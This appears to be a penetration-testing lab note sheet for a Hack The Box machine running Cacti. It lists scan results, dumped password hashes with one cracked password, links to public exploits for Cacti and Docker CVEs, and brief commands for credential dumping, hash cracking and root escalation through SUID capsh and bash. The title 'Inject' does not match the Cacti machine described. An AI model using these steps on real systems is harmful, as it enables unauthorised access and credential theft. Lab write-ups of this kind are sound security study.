# Inject

| Name      | IP           | Difficulty | OS    |
| ------ | ------------ | ---------- | ----- |
| inject | 10.10.11.211 | Easy       | Linux |

## NMAP

| HOST         | PORT | PROTO | SERVICE | VERSION                 |
| ------------ | ---- | ----- | ------- | ----------------------- |
| 10.10.11.211 | 22   | tcp   | OpenSSH | 8.2p1 Ubuntu 4ubuntu0.5 |
| 10.10.11.211 | 80   | tcp   | nginx   | 1.18.0                  |

## HEADERS

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 08 Jul 2023 03:03:21 GMT
Content-Type: text/html; charset=UTF-810.10.11.211
Connection: keep-alive
X-Powered-By: PHP/7.4.33
Last-Modified: Sat, 08 Jul 2023 03:03:20 GMT
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src *; img-src 'self'  data: blob:; style-src 'self' 'unsafe-inline' ; script-src 'self'  'unsafe-inline' ; frame-ancestors 'self'; worker-src 'self' ;
P3P: CP="CAO PSA OUR"
Cache-Control: no-store, no-cache, must-revalidate
Set-Cookie: Cacti=b9280261ee0df6337fcd5a4450fed618; path=/; HttpOnly; SameSite=Strict
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
```

## DIRECTORIES

- /docs

## USERS

- admin $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC
- marcus $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C (funkymonkey)
- guest 43e9a4ab75570f5b

## NOTES

- marko, nginx
- cactus 1.2.22
- https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit
- in a docker container
- linpeas shows `capsh` has `SUID`
- `/sbin/capsh --gid=0 --uid=0 --` to escalate to root
- `mysql --host=db --user=root --password=root cacti -e "SELECT - FROM user_auth"` dump passwords
- `hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt`
- ssh as marcus
- Docker version 20.10.5
- https://github.com/UncleJ4ck/CVE-2021-41091/tree/main
- as root on the docker, ``chmod u+s /bin/bash``
- run the exploit, cd to the vulnerable image and `./bin/bash -p`
